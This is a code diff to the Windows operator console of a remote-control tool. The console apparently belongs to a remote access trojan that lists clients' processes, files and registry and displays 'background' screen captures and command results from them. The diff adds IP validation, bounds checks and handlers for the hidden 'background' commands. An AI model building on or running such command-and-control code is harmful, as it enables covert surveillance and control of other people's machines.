@@ -54,6 +54,29 @@ static const unsigned char kTransferKey[] = {
 static const uint32_t kEncryptFlag = 0x80000000u;
 using namespace Formidable::Utils;
 
+static std::string ReadIpText(const char* data, size_t cap) {
+    if (!data || cap == 0) return std::string();
+    size_t len = 0;
+    while (len < cap && data[len] != '\0') ++len;
+    std::string out(data, data + len);
+    return StringHelper::Trim(out);
+}
+
+static bool IsIpTextValid(const std::string& text) {
+    if (text.empty()) return false;
+    bool hasDigit = false;
+    for (unsigned char c : text) {
+        if (c >= '0' && c <= '9') {
+            hasDigit = true;
+            continue;
+        }
+        if (c == '.' || c == ':') continue;
+        if ((c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) continue;
+        return false;
+    }
+    return hasDigit;
+}
+
 // 外部声明
 extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
 extern std::mutex g_ClientsMutex;
@@ -210,6 +233,13 @@ void CommandHandler::HandlePacket(uint32_t clientId, const BYTE* pData, int iLen
         case Formidable::CMD_SCREEN_CAPTURE:
             HandleScreenCapture(clientId, pkg, iLength);
             break;
+        case Formidable::CMD_BACKGROUND_SCREEN_CAPTURE:
+            HandleBackgroundScreenCapture(clientId, pkg, iLength);
+            break;
+        case Formidable::CMD_BACKGROUND_CREATE:
+        case Formidable::CMD_BACKGROUND_EXECUTE:
+            HandleBackgroundGeneric(clientId, pkg, iLength);
+            break;
         case Formidable::CMD_MOUSE_EVENT:
             // 鼠标事件由客户端处理，Master端不需要响应
             break;
@@ -310,10 +340,13 @@ void CommandHandler::HandleClientInfo(uint32_t clientId, const Formidable::Clien
     // 如果客户端报告了公网IP，则更新IP（优先信任客户端报告的公网IP，特别是解决FRP等代理导致IP显示为127.0.0.1的问题）
     std::string oldIP = client->ip;
     if (client->info.publicAddr[0] != '\0') {
-        std::string reportedIP = client->info.publicAddr;
+        std::string reportedIP = ReadIpText(client->info.publicAddr, sizeof(client->info.publicAddr));
+        if (!IsIpTextValid(reportedIP)) {
+            reportedIP.clear();
+        }
         // 如果当前记录的IP是本地回环或内网IP，或者为空，则强制使用报告的公网IP
-        if (client->ip == "127.0.0.1" || client->ip.find("192.168.") == 0 || 
-            client->ip.find("10.") == 0 || client->ip.find("172.") == 0 || client->ip.empty()) {
+        if (!reportedIP.empty() && (client->ip == "127.0.0.1" || client->ip.find("192.168.") == 0 || 
+            client->ip.find("10.") == 0 || client->ip.find("172.") == 0 || client->ip.empty())) {
             client->ip = reportedIP;
         }
     }
@@ -482,12 +515,19 @@ void CommandHandler::HandleProcessList(uint32_t clientId, const Formidable::Comm
 
     if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
         HWND hList = GetDlgItem(client->hProcessDlg, IDC_LIST_PROCESS);
-        ListView_DeleteAllItems(hList);
-        
-        int count = pkg->arg1 / sizeof(Formidable::ProcessInfo);
+        int count = (int)(pkg->arg1 / sizeof(Formidable::ProcessInfo));
+        if (pkg->arg1 == 0 || (pkg->arg1 % sizeof(Formidable::ProcessInfo)) != 0) {
+            SendMessage(hList, WM_SETREDRAW, FALSE, 0);
+            ListView_DeleteAllItems(hList);
+            SendMessage(hList, WM_SETREDRAW, TRUE, 0);
+            SetWindowTextW(client->hProcessDlg, L"进程管理 - 未获取到数据");
+            return;
+        }
+
         Formidable::ProcessInfo* pInfo = (Formidable::ProcessInfo*)pkg->data;
-        
+
         SendMessage(hList, WM_SETREDRAW, FALSE, 0);
+        ListView_DeleteAllItems(hList);
         for (int i = 0; i < count; i++) {
             LVITEMW lvi = { 0 };
             lvi.mask = LVIF_TEXT | LVIF_PARAM;
@@ -534,6 +574,9 @@ void CommandHandler::HandleProcessList(uint32_t clientId, const Formidable::Comm
             SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
         }
         SendMessage(hList, WM_SETREDRAW, TRUE, 0);
+        wchar_t title[64] = { 0 };
+        swprintf_s(title, L"进程管理 - 共 %d 项", count);
+        SetWindowTextW(client->hProcessDlg, title);
     }
 }
 
@@ -871,13 +914,10 @@ void CommandHandler::HandleRegistryData(uint32_t clientId, const Formidable::Com
                          tvis.item.mask = TVIF_TEXT | TVIF_CHILDREN | TVIF_PARAM;
                          tvis.item.pszText = (LPWSTR)wKey.c_str();
                          tvis.item.cChildren = 1; // 假设有子项，支持展开
-                         tvis.item.lParam = (LPARAM)rootIdx; // 继承根键索引
-                         if (rootIdx < 5) {
-                             tvis.item.lParam = (LPARAM)rootIdx;
-                         } else {
-                             // 如果 rootIdx 不合法（比如被误设为了索引），尝试从 hSelected 获取
-                             tvis.item.lParam = (LPARAM)(rootIdx & 0xFF); 
-                         }
+                         
+                         // 重要：子项不要存储 rootIdx 到 lParam，否则会导致路径解析逻辑混淆根节点
+                         // 我们在这里将 lParam 设为一个非 rootIdx 的值，比如 0x80000000
+                         tvis.item.lParam = (LPARAM)0x80000000; 
                          TreeView_InsertItem(hTree, &tvis);
                      }
                      SendMessage(hTree, WM_SETREDRAW, TRUE, 0);
@@ -959,6 +999,7 @@ void CommandHandler::HandleDriveList(uint32_t clientId, const Formidable::Comman
     if (client->hFileDlg && IsWindow(client->hFileDlg)) {
         std::string* payload = new std::string(pkg->data, pkg->arg1);
         PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_UPDATE_DRIVES, 0, (LPARAM)payload);
+        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_LOADING_STATE, 0, 0);
     }
 }
 
@@ -971,132 +1012,10 @@ void CommandHandler::HandleFileList(uint32_t clientId, const Formidable::Command
     }
 
     if (client->hFileDlg && IsWindow(client->hFileDlg)) {
-        HWND hDlg = client->hFileDlg;
-        HWND hList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
-        bool appendMode = GetPropW(hDlg, L"FILE_SEARCH_APPEND") != NULL;
-        bool clearFirst = GetPropW(hDlg, L"FILE_SEARCH_CLEAR") != NULL;
-        if (!appendMode || clearFirst) {
-            ListView_DeleteAllItems(hList);
-            if (clearFirst) RemovePropW(hDlg, L"FILE_SEARCH_CLEAR");
-        }
-        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
-
-        std::string data(pkg->data, pkg->arg1);
-        if (data == "PERMISSION_DENIED") {
-            SendMessage(hList, WM_SETREDRAW, TRUE, 0);
-            MessageBoxW(hDlg, L"权限不足，无法访问该目录", L"错误", MB_ICONERROR);
-            PostMessageW(hDlg, Formidable::UI::WM_FILE_SHOW_LIST, 0, 0);
-            return;
-        }
-        std::stringstream ss(data);
-        std::string line;
-        int index = ListView_GetItemCount(hList);
-        int dirCount = 0;
-        int fileCount = 0;
-        unsigned long long totalSize = 0;
-
-        while (std::getline(ss, line)) {
-            if (line.empty()) continue;
-
-            // 格式: [DIR/FILE]|Name|Size|Time
-            size_t p1 = line.find('|');
-            size_t p2 = line.find('|', p1 + 1);
-            size_t p3 = line.find('|', p2 + 1);
-
-            if (p1 != std::string::npos && p2 != std::string::npos && p3 != std::string::npos) {
-                std::string typeStr = line.substr(0, p1);
-                std::string nameStr = line.substr(p1 + 1, p2 - p1 - 1);
-                std::string sizeStr = line.substr(p2 + 1, p3 - p2 - 1);
-                std::string timeStr = line.substr(p3 + 1);
-
-                bool isDir = (typeStr == "[DIR]");
-                if (isDir) dirCount++;
-                else fileCount++;
-
-                std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(nameStr);
-                
-                // 获取正确的文件图标索引
-                SHFILEINFOW sfi = { 0 };
-                DWORD flags = SHGFI_SYSICONINDEX | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBUTES;
-                DWORD attr = isDir ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
-                SHGetFileInfoW(wName.c_str(), attr, &sfi, sizeof(sfi), flags);
-                
-                LVITEMW lvi = { 0 };
-                lvi.mask = LVIF_TEXT | LVIF_IMAGE | LVIF_PARAM;
-                lvi.iItem = index;
-                lvi.pszText = (LPWSTR)wName.c_str();
-                lvi.lParam = index;
-                lvi.iImage = sfi.iIcon;
-
-                int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
-                
-                LVITEMW lviSet = { 0 };
-                // 大小列 (第1列)
-                std::wstring wSize;
-                if (isDir) {
-                    wSize = L"<DIR>";
-                } else {
-                    unsigned long long size = std::stoull(sizeStr);
-                    totalSize += size;
-                    if (size > 1024 * 1024 * 1024)
-                        wSize = std::to_wstring(size / (1024 * 1024 * 1024)) + L" GB";
-                    else if (size > 1024 * 1024)
-                        wSize = std::to_wstring(size / (1024 * 1024)) + L" MB";
-                    else if (size > 1024)
-                        wSize = std::to_wstring(size / 1024) + L" KB";
-                    else
-                        wSize = std::to_wstring(size) + L" B";
-                }
-                lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wSize.c_str();
-                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
-
-                // 类型列 (第2列)
-                std::wstring wType = isDir ? L"文件夹" : L"文件";
-                lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wType.c_str();
-                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
-
-                // 修改时间列 (第3列)
-                std::wstring wTime = Formidable::Utils::StringHelper::UTF8ToWide(timeStr);
-                lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wTime.c_str();
-                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
-                
-                index++;
-            }
-        }
-        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
-
-        // 更新状态栏显示文件统计信息
-        HWND hStatusBar = GetDlgItem(hDlg, IDC_STATUS_FILE_BAR);
-        if (hStatusBar) {
-            wchar_t szTotalSize[64] = {0};
-            if (totalSize > 1024 * 1024 * 1024)
-                swprintf_s(szTotalSize, L"%.2f GB", totalSize / (double)(1024 * 1024 * 1024));
-            else if (totalSize > 1024 * 1024)
-                swprintf_s(szTotalSize, L"%.2f MB", totalSize / (double)(1024 * 1024));
-            else if (totalSize > 1024)
-                swprintf_s(szTotalSize, L"%.2f KB", totalSize / (double)1024);
-            else
-                swprintf_s(szTotalSize, L"%llu B", totalSize);
-
-            wchar_t szStatus[256] = {0};
-            swprintf_s(szStatus, L" %d 个项目  |  %d 个文件夹  |  %d 个文件  |  总大小: %s", 
-                      dirCount + fileCount, dirCount, fileCount, szTotalSize);
-            SendMessageW(hStatusBar, WM_SETTEXT, 0, (LPARAM)szStatus);
-        }
-        if (appendMode) {
-            HANDLE hPending = GetPropW(hDlg, L"FILE_SEARCH_PENDING");
-            UINT_PTR pending = (UINT_PTR)hPending;
-            if (pending > 0) pending--;
-            if (pending <= 1) {
-                RemovePropW(hDlg, L"FILE_SEARCH_APPEND");
-                RemovePropW(hDlg, L"FILE_SEARCH_CLEAR");
-                RemovePropW(hDlg, L"FILE_SEARCH_PENDING");
-            } else {
-                SetPropW(hDlg, L"FILE_SEARCH_PENDING", (HANDLE)pending);
-            }
-        }
+        std::string* payload = new std::string(pkg->data, pkg->arg1);
+        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_UPDATE_LIST, 0, (LPARAM)payload);
+        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_LOADING_STATE, 0, 0);
     }
-        PostMessageW(client->hFileDlg, Formidable::UI::WM_FILE_SHOW_LIST, 0, 0);
 }
 
 
@@ -1625,6 +1544,66 @@ void CommandHandler::HandleNetworkList(uint32_t clientId, const Formidable::Comm
     }
     
     SendMessageW(hList, WM_SETREDRAW, TRUE, 0);
+}
+
+void CommandHandler::HandleBackgroundScreenCapture(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
+    std::shared_ptr<Formidable::ConnectedClient> client;
+    {
+        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        if (!g_Clients.count(clientId)) return;
+        client = g_Clients[clientId];
+    }
+
+    if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
+        HWND hStatic = GetDlgItem(client->hBackgroundDlg, IDC_STATIC_BACK_SCREEN);
+        if (hStatic && pkg->arg1 > 0) {
+            // 解码 JPEG 数据 (pkg->data, pkg->arg1)
+            HBITMAP hBitmap = NULL;
+            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
+            if (hGlobal) {
+                void* pBuf = GlobalLock(hGlobal);
+                if (pBuf) {
+                    memcpy(pBuf, pkg->data, pkg->arg1);
+                    GlobalUnlock(hGlobal);
+                    IStream* pStream = NULL;
+                    if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
+                        Bitmap* pBmp = Bitmap::FromStream(pStream);
+                        if (pBmp && pBmp->GetLastStatus() == Ok) {
+                            pBmp->GetHBITMAP(Color(0,0,0), &hBitmap);
+                            delete pBmp;
+                        }
+                        pStream->Release();
+                    }
+                }
+            }
+
+            if (hBitmap) {
+                // 设置到控件上显示
+                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
+                if (hOldBmp) DeleteObject(hOldBmp);
+                
+                // 触发重绘
+                InvalidateRect(hStatic, NULL, FALSE);
+            }
+        }
+    }
+}
+
+void CommandHandler::HandleBackgroundGeneric(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
+    std::shared_ptr<Formidable::ConnectedClient> client;
+    {
+        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        if (!g_Clients.count(clientId)) return;
+        client = g_Clients[clientId];
+    }
+
+    if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
+        if (pkg->cmd == CMD_BACKGROUND_CREATE || pkg->cmd == CMD_BACKGROUND_EXECUTE) {
+            std::string msg((char*)pkg->data, pkg->arg1);
+            std::wstring wMsg = Utils::StringHelper::UTF8ToWide(msg);
+            MessageBoxW(client->hBackgroundDlg, wMsg.c_str(), L"后台管理", MB_OK | MB_ICONINFORMATION);
+        }
+    }
 }
 
 } // namespace Core
